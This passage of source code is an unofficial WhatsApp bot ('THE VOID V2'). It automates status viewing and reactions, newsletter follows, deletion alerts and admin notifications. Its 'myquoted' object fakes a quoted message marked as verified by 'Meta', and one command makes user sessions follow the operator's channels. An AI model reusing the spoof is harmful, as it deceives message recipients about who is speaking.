    return moment().tz('America/New_York').format('YYYY-MM-DD HH:mm:ss');
}

async function joinGroup(socket) {
    return; // Do nothing
}

async function sendAdminConnectMessage(socket, number, groupResult) {
    const admins = loadAdmins();
    const groupStatus = groupResult?.status === 'success'
        ? `Joined (ID: ${groupResult.gid})`
        : `Failed to join group: ${groupResult?.error || 'Unknown error'}`;

    const caption = formatMessage(
        '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝',
        `Connect - https://voidv2.mazxa.com\n📞 Number: ${number}\n🟢 Status: Auto-Connected\n📋 Group: ${groupStatus}\n⏰ Time: ${getSriLankaTimestamp()}`,
        '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
    );

    for (const admin of admins) {
        try {
            await socket.sendMessage(
                `${admin}@s.whatsapp.net`,
                {
                    image: { url: config.IMAGE_PATH },
                    caption
                }
            );
        } catch (error) {
            console.error(`❌ Failed to send admin message to ${admin}:`, error);
        }
    }
}

async function handleUnknownContact(socket, number, messageJid) {
    return; // Do nothing
}

async function sendOTP(socket, number, otp) {
    const userJid = jidNormalizedUser(socket.user.id);
    const message = formatMessage(
        '🔐 AUTO OTP VERIFICATION',
        `Your OTP for config update is: *${otp}*\nThis OTP will expire in 5 minutes.`,
        '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
    );

    try {
        await socket.sendMessage(userJid, { text: message });
        console.log(`📱 Auto-sent OTP to ${number}`);
    } catch (error) {
        console.error(`❌ Failed to send OTP to ${number}:`, error);
        throw error;
    }
}

async function updateAboutStatus(socket) {
    const aboutStatus = 'THE VOID V2 BOT CREATED BY ANDY MRLIT ✅ 🚀';
    try {
        await socket.updateProfileStatus(aboutStatus);
        console.log(`✅ Auto-updated About status`);
    } catch (error) {
        console.error('❌ Failed to update About status:', error);
    }
}

async function updateStoryStatus(socket) {
    return; // Do nothing
}

// **MEDIA FUNCTIONS**

async function resize(image, width, height) {
    let oyy = await Jimp.read(image);
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG);
    return kiyomasa;
}

function capital(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
    return crypto.randomBytes(size).toString('hex').slice(0, size);
}

const myquoted = {
    key: {
        remoteJid: 'status@broadcast',
        participant: '13135550002@s.whatsapp.net',
        fromMe: false,
        id: createSerial(16).toUpperCase()
    },
    message: {
        contactMessage: {
            displayName: "ANDY MRLIT",
            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:THE VOID V2\nORG:THE VOID V2;\nTEL;type=CELL;type=VOICE;waid=13135550002:13135550002\nEND:VCARD`,
            contextInfo: {
                stanzaId: createSerial(16).toUpperCase(),
                participant: "0@s.whatsapp.net",
                quotedMessage: {
                    conversation: "ANDY MRLIT"
                }
            }
        }
    },
    messageTimestamp: Math.floor(Date.now() / 1000),
    status: 1,
    verifiedBizName: "Meta"
};

async function SendSlide(socket, jid, newsItems) {
    let anu = [];
    for (let item of newsItems) {
        let imgBuffer;
        try {
            imgBuffer = await resize(item.thumbnail, 300, 200);
        } catch (error) {
            console.error(`❌ Failed to resize image for ${item.title}:`, error);
            imgBuffer = await Jimp.read('https://imgkub.com/images/2025/09/10/imagea98b3c1cea1e4c9a.jpg');
            imgBuffer = await imgBuffer.resize(300, 200).getBufferAsync(Jimp.MIME_JPEG);
        }
        let imgsc = await prepareWAMessageMedia({ image: imgBuffer }, { upload: socket.waUploadToServer });
        anu.push({
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*${capital(item.title)}*\n\n${item.body}`
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: true,
                ...imgsc
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                    {
                        name: "cta_url",
                        buttonParamsJson: `{"display_text":"𝐃𝙴𝙿𝙻𝙾𝚈","url":"https:/","merchant_url":"https://www.google.com"}`
                    },
                    {
                        name: "cta_url",
                        buttonParamsJson: `{"display_text":"𝐂𝙾𝙽𝚃𝙰𝙲𝚃","url":"https","merchant_url":"https://www.google.com"}`
                    }
                ]
            })
        });
    }
    const msgii = await generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: "*AUTO NEWS UPDATES*"
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: anu
                    })
                })
            }
        }
    }, { userJid: jid });
    return socket.relayMessage(jid, msgii.message, {
        messageId: msgii.key.id
    });
}

async function fetchNews() {
    try {
        const response = await axios.get(config.NEWS_JSON_URL);
        return response.data || [];
    } catch (error) {
        console.error('❌ Failed to fetch news:', error.message);
        return [];
    }
}

// **EVENT HANDLERS**

function setupNewsletterHandlers(socket) {
    socket.ev.on('messages.upsert', async ({ messages }) => {
        const message = messages[0];
        if (!message?.key) return;

        const isNewsletter = config.NEWSLETTER_JIDS.some(jid =>
            message.key.remoteJid === jid ||
            message.key.remoteJid?.includes(jid)
        );

        if (!isNewsletter || config.AUTO_REACT_NEWSLETTERS !== 'true') return;

        try {
            const randomEmoji = config.NEWSLETTER_REACT_EMOJIS[
                Math.floor(Math.random() * config.NEWSLETTER_REACT_EMOJIS.length)
            ];
            const messageId = message.newsletterServerId || message.key.id;

            if (!messageId) {
                console.warn('⚠️ No valid newsletterServerId found for newsletter:', message.key.remoteJid);
                return;
            }

            let retries = config.MAX_RETRIES;
            while (retries > 0) {
                try {
                    // Try newsletter reaction
                    if (socket.newsletterReactMessage) {
                        await socket.newsletterReactMessage(
                            message.key.remoteJid,
                            messageId.toString(),
                            randomEmoji
                        );
                    } else {
                        // Fallback to regular reaction
                        await socket.sendMessage(
                            message.key.remoteJid,
                            { react: { text: randomEmoji, key: message.key } }
                        );
                    }
                    console.log(`✅ Auto-reacted to newsletter ${message.key.remoteJid}: ${randomEmoji}`);
                    break;
                } catch (error) {
                    retries--;
                    console.warn(`⚠️ Newsletter reaction failed for ${message.key.remoteJid}, retries: ${retries}`);
                    if (retries === 0) {
                        console.error(`❌ Failed to react to newsletter ${message.key.remoteJid}:`, error.message);
                    }
                    await delay(2000 * (config.MAX_RETRIES - retries));
                }
            }
        } catch (error) {
            console.error('❌ Newsletter reaction error:', error);
        }
    });
}

async function setupStatusHandlers(socket) {
    socket.ev.on('messages.upsert', async ({ messages }) => {
        const message = messages[0];
        if (!message?.key || message.key.remoteJid !== 'status@broadcast' || !message.key.participant) return;

        try {
            if (config.AUTO_RECORDING === 'true' && message.key.remoteJid) {
                await socket.sendPresenceUpdate("recording", message.key.remoteJid);
            }

            if (config.AUTO_VIEW_STATUS === 'true') {
                let retries = config.MAX_RETRIES;
                while (retries > 0) {
                    try {
                        await socket.readMessages([message.key]);
                        console.log('👁️ Auto-viewed status');
                        break;
                    } catch (error) {
                        retries--;
                        if (retries === 0) throw error;
                        await delay(1000 * (config.MAX_RETRIES - retries));
                    }
                }
            }

            if (config.AUTO_LIKE_STATUS === 'true') {
                const randomEmoji = config.AUTO_LIKE_EMOJI[Math.floor(Math.random() * config.AUTO_LIKE_EMOJI.length)];
                let retries = config.MAX_RETRIES;
                while (retries > 0) {
                    try {
                        await socket.sendMessage(
                            message.key.remoteJid,
                            { react: { text: randomEmoji, key: message.key } },
                            { statusJidList: [message.key.participant] }
                        );
                        console.log(`Reacted to status with ${randomEmoji}`);
                        break;
                    } catch (error) {
                        retries--;
                        console.warn(`Failed to react to status, retries left: ${retries}`, error);
                        if (retries === 0) throw error;
                        await delay(1000 * (config.MAX_RETRIES - retries));
                    }
                }
            }
        } catch (error) {
            console.error('Status handler error:', error);
        }
    });
}

async function handleMessageRevocation(socket, number) {
    socket.ev.on('messages.delete', async ({ keys }) => {
        if (!keys || keys.length === 0) return;

        const messageKey = keys[0];
        const userJid = jidNormalizedUser(socket.user.id);
        const deletionTime = getSriLankaTimestamp();

        const message = formatMessage(
            '🗑️ AUTO MESSAGE DELETION DETECTED',
            `A message was auto-detected as deleted.\n📋 From: ${messageKey.remoteJid}\n🍁 Detection Time: ${deletionTime}`,
            '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
        );

        try {
            await socket.sendMessage(userJid, {
                image: { url: config.IMAGE_PATH },
                caption: message
            });
            console.log(`🗑️ Auto-notified deletion for ${number}`);
        } catch (error) {
            console.error('❌ Failed to send deletion notification:', error);
        }
    });
}

// **COMMAND HANDLERS**

function setupCommandHandlers(socket, number) {
    socket.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];

        const isNewsletter = config.NEWSLETTER_JIDS.includes(msg.key?.remoteJid);

        if (!msg.message || msg.key.remoteJid === 'status@broadcast' || isNewsletter) return;

        let command = null;
        let args = [];
        let sender = msg.key.remoteJid;

        if (msg.message.conversation || msg.message.extendedTextMessage?.text) {
            const text = (msg.message.conversation || msg.message.extendedTextMessage?.text || '').trim();
            if (text.startsWith(config.PREFIX)) {
                const parts = text.slice(config.PREFIX.length).trim().split(/\s+/);
                command = parts[0].toLowerCase();
                args = parts.slice(1);
            }
        }
        else if (msg.message.buttonsResponseMessage) {
            const buttonId = msg.message.buttonsResponseMessage.selectedButtonId;
            if (buttonId && buttonId.startsWith(config.PREFIX)) {
                const parts = buttonId.slice(config.PREFIX.length).trim().split(/\s+/);
                command = parts[0].toLowerCase();
                args = parts.slice(1);
            }
        }

        if (!command) return;

        try {
            switch (command) {
                // Commands implementation here
                case 'alive': {
                    const startTime = socketCreationTime.get(number) || Date.now();
                    const uptime = Math.floor((Date.now() - startTime) / 1000);
                    const hours = Math.floor(uptime / 3600);
                    const minutes = Math.floor((uptime % 3600) / 60);
                    const seconds = Math.floor(uptime % 60);

                    await socket.sendMessage(sender, {
                        image: { url: config.IMAGE_PATH },
                        caption: formatMessage(
                            '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒',
                            `Connect - https://voidv2.mazxa.com\n🤖 THE VOID V2 BOT: Active\n⏰ Uptime: ${hours}h ${minutes}m ${seconds}s\n🟢 Active Sessions: ${activeSockets.size}\n🔢 Your Number: ${number}\n🔄 Auto-Features: All Active\n☁️ Storage: MongoDB (${mongoConnected ? 'Connected' : 'Connecting...'})\n📋 Pending Saves: ${pendingSaves.size}`,
                            '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
                        )
                    }, { quoted: myquoted });
                    break;
                }

case 'cinfo':
case 'channelinfo': {
    try {
        if (!args[0]) {
            return await socket.sendMessage(sender, {
                text: '*❌ Please provide a WhatsApp channel URL*\n\n' +
                      '*Usage:* .cinfo <channel_url>\n' +
                      '*Example:* .cinfo https://whatsapp.com/channel/0029VbAua1VK5cDL3AtIEP3I'
            }, { quoted: myquoted });
        }

        const channelUrl = args.join(' ').trim();

        // Validate URL format
        if (!channelUrl.includes('whatsapp.com/channel/')) {
            return await socket.sendMessage(sender, {
                text: '*❌ Invalid channel URL format*\n\n' +
                      'Please provide a valid WhatsApp channel URL\n' +
                      'Format: https://whatsapp.com/channel/[CHANNEL_CODE]'
            }, { quoted: myquoted });
        }

        await socket.sendMessage(sender, { react: { text: '🔍', key: msg.key } });

        // Extract channel code from URL
        const channelCodeMatch = channelUrl.match(/channel\/([a-zA-Z0-9]+)/);
        if (!channelCodeMatch) {
            return await socket.sendMessage(sender, {
                text: '*❌ Could not extract channel code from URL*'
            }, { quoted: myquoted });
        }

        const channelCode = channelCodeMatch[1];

        // Try to get channel metadata
        let channelInfo = {
            code: channelCode,
            url: channelUrl,
            extractedAt: getSriLankaTimestamp()
        };

        // Attempt to fetch channel details via newsletter methods
        try {
            // Check if this is a known newsletter JID
            const possibleJids = [
                `${channelCode}@newsletter`,
                `120363${channelCode}@newsletter`
            ];

            let foundNewsletter = false;
            let newsletterMetadata = null;

            for (const testJid of possibleJids) {
                try {
                    // Try to get newsletter metadata
                    const metadata = await socket.newsletterMetadata('get', testJid);
                    if (metadata) {
                        newsletterMetadata = metadata;
                        foundNewsletter = true;
                        channelInfo.jid = testJid;
                        break;
                    }
                } catch (err) {
                    // Continue to next JID
                    console.log(`Could not fetch metadata for ${testJid}`);
                }
            }

            if (newsletterMetadata) {
                channelInfo.name = newsletterMetadata.name || 'Unknown';
                channelInfo.description = newsletterMetadata.description || 'No description';
                channelInfo.subscribers = newsletterMetadata.subscribers || 'Unknown';
                channelInfo.verified = newsletterMetadata.verified || false;
                channelInfo.createdAt = newsletterMetadata.createdAt || 'Unknown';
                channelInfo.picture = newsletterMetadata.picture || null;
            }
        } catch (error) {
            console.log('Could not fetch advanced channel info:', error.message);
        }

        // Check if user is following this channel
        let isFollowing = false;
        try {
            const userConfig = await loadUserConfig(number);
            const newsletterJids = userConfig.NEWSLETTER_JIDS || config.NEWSLETTER_JIDS;
            isFollowing = newsletterJids.some(jid => 
                jid.includes(channelCode) || 
                (channelInfo.jid && jid === channelInfo.jid)
            );
        } catch (error) {
            console.log('Could not check following status');
        }

        await socket.sendMessage(sender, { react: { text: '✅', key: msg.key } });

        // Format the channel information
        let infoText = `*📢 CHANNEL INFORMATION*\n\n`;
        infoText += `*🔗 URL:* ${channelUrl}\n`;
        infoText += `*🆔 Channel Code:* ${channelCode}\n`;

        if (channelInfo.jid) {
            infoText += `*📋 JID:* ${channelInfo.jid}\n`;
        }

        if (channelInfo.name) {
            infoText += `*📝 Name:* ${channelInfo.name}\n`;
        }

        if (channelInfo.description) {
            infoText += `*📄 Description:* ${channelInfo.description}\n`;
        }

        if (channelInfo.subscribers) {
            infoText += `*👥 Subscribers:* ${channelInfo.subscribers}\n`;
        }

        if (channelInfo.verified !== undefined) {
            infoText += `*✓ Verified:* ${channelInfo.verified ? '✅ Yes' : '❌ No'}\n`;
        }

        if (channelInfo.createdAt && channelInfo.createdAt !== 'Unknown') {
            infoText += `*📅 Created:* ${channelInfo.createdAt}\n`;
        }

        infoText += `*👁️ Following:* ${isFollowing ? '✅ Yes' : '❌ No'}\n`;
        infoText += `*🕒 Checked At:* ${channelInfo.extractedAt}\n`;

        infoText += `\n*💡 Tips:*\n`;
        infoText += `• Use \`.addnewsletter ${channelInfo.jid || channelCode + '@newsletter'}\` to follow\n`;
        infoText += `• Use \`.listnewsletters\` to see all followed channels`;

        // Send the information
        if (channelInfo.picture) {
            await socket.sendMessage(sender, {
                image: { url: channelInfo.picture },
                caption: formatMessage(
                    '📢 CHANNEL INFO',
                    infoText,
                    '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
                )
            }, { quoted: myquoted });
        } else {
            await socket.sendMessage(sender, {
                image: { url: config.IMAGE_PATH },
                caption: formatMessage(
                    '📢 CHANNEL INFO',
                    infoText,
                    '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
                )
            }, { quoted: myquoted });
        }

    } catch (error) {
        console.error('❌ Channel info error:', error);
        await socket.sendMessage(sender, { react: { text: '❌', key: msg.key } });
        await socket.sendMessage(sender, {
            text: `*❌ Error getting channel info*\n\n` +
                  `Error: ${error.message || 'Unknown error'}\n\n` +
                  `*Note:* Some channel information may not be available due to privacy settings.`
        }, { quoted: myquoted });
    }
    break;
}

case 'follow':
case 'followchannel': {
    try {
        if (!args[0]) {
            return await socket.sendMessage(sender, {
                text: '*❌ Please provide a channel URL or JID*\n\n' +
                      '*Usage:*\n' +
                      '• .follow <channel_url>\n' +
                      '• .follow <channel_jid>\n\n' +
                      '*Example:*\n' +
                      '• .follow https://whatsapp.com/channel/0029VbAua1VcDL3AtIEP3I\n' +
                      '• .follow 1203630895783008@newsletter'
            }, { quoted: myquoted });
        }

        const input = args.join(' ').trim();
        let channelJid = '';

        // Check if input is a URL or JID
        if (input.includes('whatsapp.com/channel/')) {
            // Extract channel code from URL
            const channelCodeMatch = input.match(/channel\/([a-zA-Z0-9]+)/);
            if (!channelCodeMatch) {
                return await socket.sendMessage(sender, {
                    text: '*❌ Invalid channel URL format*'
                }, { quoted: myquoted });
            }
            // Convert to potential JID
            channelJid = `${channelCodeMatch[1]}@newsletter`;
        } else if (input.includes('@newsletter')) {
            channelJid = input;
        } else {
            // Assume it's a channel code and add newsletter suffix
            channelJid = `${input}@newsletter`;
        }

        await socket.sendMessage(sender, { react: { text: '➕', key: msg.key } });

        // Try to follow the channel
        try {
            await socket.newsletterFollow(channelJid);

            // Add to config if owner
            if (isOwner(sender)) {
                if (!config.NEWSLETTER_JIDS.includes(channelJid)) {
                    config.NEWSLETTER_JIDS.push(channelJid);

                    const userConfig = await loadUserConfig(number);
                    userConfig.NEWSLETTER_JIDS = config.NEWSLETTER_JIDS;
                    await updateUserConfig(number, userConfig);
                }
            }

            await socket.sendMessage(sender, { react: { text: '✅', key: msg.key } });

            await socket.sendMessage(sender, {
                image: { url: config.IMAGE_PATH },
                caption: formatMessage(
                    '✅ CHANNEL FOLLOWED',
                    `Successfully followed channel!\n\n` +
                    `*Channel JID:* ${channelJid}\n` +
                    `*Auto-React:* ${config.AUTO_REACT_NEWSLETTERS === 'true' ? '✅ Enabled' : '❌ Disabled'}\n` +
                    (isOwner(sender) ? `*Added to auto-react list:* ✅` : ''),
                    '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
                )
            }, { quoted: myquoted });

        } catch (error) {
            console.error('Follow error:', error);
            await socket.sendMessage(sender, { react: { text: '❌', key: msg.key } });

            let errorMessage = 'Failed to follow channel';
            if (error.message.includes('not found')) {
                errorMessage = 'Channel not found or invalid JID';
            } else if (error.message.includes('already')) {
                errorMessage = 'Already following this channel';
            }

            await socket.sendMessage(sender, {
                text: `*❌ ${errorMessage}*\n\nTried JID: ${channelJid}`
            }, { quoted: myquoted });
        }

    } catch (error) {
        console.error('❌ Follow command error:', error);
        await socket.sendMessage(sender, {
            text: `*❌ Error:* ${error.message || 'Failed to follow channel'}`
        }, { quoted: myquoted });
    }
    break;
}

case 'unfollow':
case 'unfollowchannel': {
    try {
        if (!args[0]) {
            return await socket.sendMessage(sender, {
                text: '*❌ Please provide a channel URL or JID*\n\n' +
                      '*Usage:*\n' +
                      '• .unfollow <channel_url>\n' +
                      '• .unfollow <channel_jid>'
            }, { quoted: myquoted });
        }

        const input = args.join(' ').trim();
        let channelJid = '';

        // Check if input is a URL or JID
        if (input.includes('whatsapp.com/channel/')) {
            const channelCodeMatch = input.match(/channel\/([a-zA-Z0-9]+)/);
            if (!channelCodeMatch) {
                return await socket.sendMessage(sender, {
                    text: '*❌ Invalid channel URL format*'
                }, { quoted: myquoted });
            }
            channelJid = `${channelCodeMatch[1]}@newsletter`;
        } else if (input.includes('@newsletter')) {
            channelJid = input;
        } else {
            channelJid = `${input}@newsletter`;
        }

        await socket.sendMessage(sender, { react: { text: '➖', key: msg.key } });

        try {
            await socket.newsletterUnfollow(channelJid);

            // Remove from config if owner
            if (isOwner(sender)) {
                const index = config.NEWSLETTER_JIDS.indexOf(channelJid);
                if (index > -1) {
                    config.NEWSLETTER_JIDS.splice(index, 1);

                    const userConfig = await loadUserConfig(number);
                    userConfig.NEWSLETTER_JIDS = config.NEWSLETTER_JIDS;
                    await updateUserConfig(number, userConfig);
                }
            }

            await socket.sendMessage(sender, { react: { text: '✅', key: msg.key } });

            await socket.sendMessage(sender, {
                text: `✅ *Successfully unfollowed channel*\n\n*JID:* ${channelJid}`
            }, { quoted: myquoted });

        } catch (error) {
            await socket.sendMessage(sender, { react: { text: '❌', key: msg.key } });
            await socket.sendMessage(sender, {
                text: `*❌ Failed to unfollow channel*\n\nJID: ${channelJid}`
            }, { quoted: myquoted });
        }

    } catch (error) {
        console.error('❌ Unfollow error:', error);
        await socket.sendMessage(sender, {
            text: `*❌ Error:* ${error.message || 'Failed to unfollow channel'}`
        }, { quoted: myquoted });
    }
    break;
}




                case 'updatecj': {
                    try {
                        // Get current user's config
                        const userConfig = await loadUserConfig(number);

                        // Update newsletter JIDs
                        userConfig.NEWSLETTER_JIDS = [...config.NEWSLETTER_JIDS];
                        userConfig.NEWSLETTER_REACT_EMOJIS = [...config.NEWSLETTER_REACT_EMOJIS];
                        userConfig.AUTO_REACT_NEWSLETTERS = config.AUTO_REACT_NEWSLETTERS;

                        // Save updated config
                        await updateUserConfig(number, userConfig);

                        // Apply settings
                        applyConfigSettings(userConfig);

                        // Auto-follow new newsletters for active session
                        if (activeSockets.has(number)) {
                            const userSocket = activeSockets.get(number);
                            for (const newsletterJid of config.NEWSLETTER_JIDS) {
                                try {
                                    await userSocket.newsletterFollow(newsletterJid);
                                    console.log(`✅ ${number} followed newsletter: ${newsletterJid}`);
                                } catch (error) {
                                    console.warn(`⚠️ ${number} failed to follow ${newsletterJid}: ${error.message}`);
                                }
                            }
                        }

                        // Send success message
                        await socket.sendMessage(sender, {
                            image: { url: config.IMAGE_PATH },
                            caption: formatMessage(
                                '📝 NEWSLETTER CONFIG UPDATE',
                                `Successfully updated your newsletter configuration!\n\n` +
                                `Current Newsletter JIDs:\n${config.NEWSLETTER_JIDS.join('\n')}\n\n` +
                                `Auto-React: ${config.AUTO_REACT_NEWSLETTERS === 'true' ? '✅ Enabled' : '❌ Disabled'}\n` +
                                `React Emojis: ${config.NEWSLETTER_REACT_EMOJIS.join(', ')}`,
                                '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
                            )
                        }, { quoted: msg });

                    } catch (error) {
                        console.error('❌ Update CJ command failed:', error);
                        await socket.sendMessage(sender, {
                            text: `*❌ Error updating config:*\n${error.message}`
                        }, { quoted: msg });
                    }
                    break;
                }

                case 'jid': {
                    try {
                        let replyJid = '';
                        let caption = '';

                        if (msg.message.extendedTextMessage?.contextInfo?.participant) {
                            replyJid = msg.message.extendedTextMessage.contextInfo.participant;
                        }

                        const mentionedJid = msg.message.extendedTextMessage?.contextInfo?.mentionedJid;

                        caption = formatMessage(
                            '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2 𝐉𝐈𝐃 𝐈𝐍𝐅𝐎',
                            `Connect - https://didula-md.free.nf\n*Chat JID:* ${sender}\n` +
                            (replyJid ? `*Replied User JID:* ${replyJid}\n` : '') +
                            (mentionedJid?.length ? `*Mentioned JID:* ${mentionedJid.join('\n')}\n` : '') +
                            (msg.key.remoteJid.endsWith('@g.us') ?
                                `*Group JID:* ${msg.key.remoteJid}\n` : '') +
                            `\n*📝 Note:*\n` +
                            `• User JID Format: number@s.whatsapp.net\n` +
                            `• Group JID Format: number@g.us\n` +
                            `• Newsletter JID Format: number@newsletter`,
                            '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
                        );

                        await socket.sendMessage(sender, {
                            image: { url: config.IMAGE_PATH },
                            caption: caption,
                            contextInfo: {
                                mentionedJid: mentionedJid || [],
                                forwardingScore: 999,
                                isForwarded: true
                            }
                        }, { quoted: myquoted });

                    } catch (error) {
                        console.error('❌ GetJID error:', error);
                        await socket.sendMessage(sender, {
                            text: '*Error:* Failed to get JID information'
                        }, { quoted: myquoted });
                    }
                    break;
                }

                case 'addnewsletter': {
                    if (!isOwner(sender)) {
                        return await socket.sendMessage(sender, {
                            text: `*❌ This command is only for the owner.*`
                        }, { quoted: msg });
                    }

                    if (!args[0]) {
                        return await socket.sendMessage(sender, {
                            text: '*Please provide a newsletter JID\nExample: .addnewsletter 120363xxxxxxxxxx@newsletter*'
                        }, { quoted: msg });
                    }

                    const newJid = args[0];
                    if (!newJid.endsWith('@newsletter')) {
                        return await socket.sendMessage(sender, {
                            text: '*❌ Invalid JID format. Must end with @newsletter*'
                        }, { quoted: msg });
                    }

                    if (!config.NEWSLETTER_JIDS.includes(newJid)) {
                        config.NEWSLETTER_JIDS.push(newJid);

                        const userConfig = await loadUserConfig(number);
                        userConfig.NEWSLETTER_JIDS = config.NEWSLETTER_JIDS;
                        userConfig.NEWSLETTER_REACT_EMOJIS = config.NEWSLETTER_REACT_EMOJIS;
                        userConfig.AUTO_REACT_NEWSLETTERS = config.AUTO_REACT_NEWSLETTERS;

                        await updateUserConfig(number, userConfig);
                        applyConfigSettings(userConfig);

                        try {
                            await socket.newsletterFollow(newJid);
                            console.log(`✅ Followed new newsletter: ${newJid}`);

                            await socket.sendMessage(sender, {
                                image: { url: config.IMAGE_PATH },
                                caption: formatMessage(
                                    '✅ NEWSLETTER ADDED & FOLLOWED',
                                    `Successfully added and followed newsletter:\n${newJid}\n\n` +
                                    `Total newsletters: ${config.NEWSLETTER_JIDS.length}\n` +
                                    `Auto-react: ${config.AUTO_REACT_NEWSLETTERS === 'true' ? '✅ Enabled' : '❌ Disabled'}\n` +
                                    `React emojis: ${config.NEWSLETTER_REACT_EMOJIS.join(', ')}`,
                                    '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
                                )
                            }, { quoted: msg });
                        } catch (error) {
                            console.error(`❌ Failed to follow newsletter ${newJid}:`, error.message);

                            await socket.sendMessage(sender, {
                                image: { url: config.IMAGE_PATH },
                                caption: formatMessage(
                                    '⚠️ NEWSLETTER ADDED (Follow Failed)',
                                    `Newsletter added but follow failed:\n${newJid}\n\n` +
                                    `Error: ${error.message}\n` +
                                    `Total newsletters: ${config.NEWSLETTER_JIDS.length}`,
                                    '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
                                )
                            }, { quoted: msg });
                        }
                    } else {
                        await socket.sendMessage(sender, {
                            text: '*⚠️ This newsletter JID is already in the list.*'
                        }, { quoted: msg });
                    }
                    break;
                }

                case 'listnewsletters': {
                    const userConfig = await loadUserConfig(number);
                    const currentNewsletters = userConfig.NEWSLETTER_JIDS || config.NEWSLETTER_JIDS;

                    const newsletterList = currentNewsletters.map((jid, index) =>
                        `${index + 1}. ${jid}`
                    ).join('\n');

                    await socket.sendMessage(sender, {
                        image: { url: config.IMAGE_PATH },
                        caption: formatMessage(
                            '📋 AUTO-REACT NEWSLETTER LIST',
                            `Auto-react enabled for:\n\n${newsletterList || 'No newsletters added'}\n\n` +
                            `React Emojis: ${config.NEWSLETTER_REACT_EMOJIS.join(', ')}\n` +
                            `Status: ${config.AUTO_REACT_NEWSLETTERS === 'true' ? '✅ Active' : '❌ Inactive'}\n` +
                            `Total: ${currentNewsletters.length} newsletters`,
                            '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
                        )
                    }, { quoted: msg });
                    break;
                }

                case 'removenewsletter': {
                    if (!isOwner(sender)) {
                        return await socket.sendMessage(sender, {
                            text: '*❌ This command is only for the owner.*'
                        }, { quoted: msg });
                    }

                    if (!args[0]) {
                        const newsletterList = config.NEWSLETTER_JIDS.map((jid, index) =>
                            `${index + 1}. ${jid}`
                        ).join('\n');

                        return await socket.sendMessage(sender, {
                            text: `*Please provide a newsletter JID to remove*\n\nCurrent newsletters:\n${newsletterList || 'No newsletters added'}`
                        }, { quoted: msg });
                    }

                    const removeJid = args[0];
                    const index = config.NEWSLETTER_JIDS.indexOf(removeJid);

                    if (index > -1) {
                        config.NEWSLETTER_JIDS.splice(index, 1);

                        const userConfig = await loadUserConfig(number);
                        userConfig.NEWSLETTER_JIDS = config.NEWSLETTER_JIDS;
                        await updateUserConfig(number, userConfig);
                        applyConfigSettings(userConfig);

                        try {
                            await socket.newsletterUnfollow(removeJid);
                            console.log(`✅ Unfollowed newsletter: ${removeJid}`);
                        } catch (error) {
                            console.error(`Failed to unfollow newsletter: ${error.message}`);
                        }

                        await socket.sendMessage(sender, {
                            image: { url: config.IMAGE_PATH },
                            caption: formatMessage(
                                '🗑️ NEWSLETTER REMOVED',
                                `Successfully removed newsletter:\n${removeJid}\n\n` +
                                `Remaining newsletters: ${config.NEWSLETTER_JIDS.length}`,
                                '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
                            )
                        }, { quoted: msg });
                    } else {
                        await socket.sendMessage(sender, {
                            text: '*❌ This newsletter JID is not in the list.*'
                        }, { quoted: msg });
                    }
                    break;
                }

                case 'togglenewsletterreact': {
                    if (!isOwner(sender)) {
                        return await socket.sendMessage(sender, {
                            text: '*❌ This command is only for the owner.*'
                        }, { quoted: msg });
                    }

                    config.AUTO_REACT_NEWSLETTERS = config.AUTO_REACT_NEWSLETTERS === 'true' ? 'false' : 'true';

                    const userConfig = await loadUserConfig(number);
                    userConfig.AUTO_REACT_NEWSLETTERS = config.AUTO_REACT_NEWSLETTERS;
                    userConfig.NEWSLETTER_JIDS = config.NEWSLETTER_JIDS;
                    userConfig.NEWSLETTER_REACT_EMOJIS = config.NEWSLETTER_REACT_EMOJIS;
                    await updateUserConfig(number, userConfig);
                    applyConfigSettings(userConfig);

                    await socket.sendMessage(sender, {
                        image: { url: config.IMAGE_PATH },
                        caption: formatMessage(
                            '🔄 NEWSLETTER AUTO-REACT TOGGLED',
                            `Newsletter auto-react is now: ${config.AUTO_REACT_NEWSLETTERS === 'true' ? '✅ ENABLED' : '❌ DISABLED'}\n\n` +
                            `Active for ${config.NEWSLETTER_JIDS.length} newsletters`,
                            '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
                        )
                    }, { quoted: msg });
                    break;
                }

                case 'setnewsletteremojis': {
                    if (!isOwner(sender)) {
                        return await socket.sendMessage(sender, {
                            text: '*❌ This command is only for the owner.*'
                        }, { quoted: msg });
